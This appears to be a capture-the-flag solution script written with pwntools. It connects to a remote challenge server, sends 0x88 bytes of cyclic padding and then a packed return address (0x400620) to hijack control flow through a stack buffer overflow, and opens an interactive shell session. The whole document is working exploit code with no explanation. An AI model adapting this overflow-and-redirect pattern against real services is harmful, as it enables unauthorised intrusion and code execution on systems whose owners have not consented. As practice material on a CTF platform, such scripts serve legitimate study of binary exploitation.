from pwn import *
# io = process('./pwn')
io = remote('node4.buuoj.cn', 27850)
io.sendlineafter(b'Input your message:\n', cyclic(0x88) + p64(0x400620))
io.interactive()